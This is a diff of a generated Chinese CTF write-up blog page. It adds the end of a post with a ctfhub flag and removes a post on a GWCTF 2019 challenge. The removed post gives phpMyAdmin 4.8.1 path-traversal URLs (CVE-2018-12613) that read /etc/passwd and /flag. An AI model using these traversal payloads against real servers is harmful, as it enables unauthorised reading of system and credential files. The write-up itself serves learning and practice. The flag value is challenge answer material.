+<p>其中存在有flag_104634908.txt文件，在浏览器访问：<br><img src="https://img-blog.csdnimg.cn/20210226234942245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p>
+<p>ctfhub{be22b310ab4356e2cd822df3}</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/24/20210224/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1848,159 +2061,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/07/20210207/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="花间一壶酒">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/02/07/20210207/" itemprop="url">（GWCTF 2019）我有一个数据库</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-07T17:17:45+08:00">
-                2021-02-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p><img src="https://img-blog.csdnimg.cn/20210209220051394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">扫描目录<br><img src="https://img-blog.csdnimg.cn/20210209220444626.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210209220455771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">phpmyadmin任意文件读取</p>
-<p><img src="https://img-blog.csdnimg.cn/20210209220604959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">该版本存在远程文件读取漏洞<br>读取passwd文件</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%<span class="number">253f</span>/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<p>读取成功，尝试读取flag文件</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%<span class="number">253f</span>/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210209220740102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">参考：<a target="_blank" rel="noopener" href="https://www.abelche.com/2019/11/16/CVE/phpmyadmin%204.8.1%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-12613%EF%BC%89/">phpmyadmin 4.8.1 远程文件包含漏洞</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.vulnspy.com/cn-phpmyadmin-4.8.1-lfi-to-rce/">phpMyAdmin 4.8.x 本地文件包含漏洞利用</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">&gt;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">&gt;</a>
   </nav>
 
 
@@ -2046,7 +2111,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2068,7 +2133,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-count">58</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
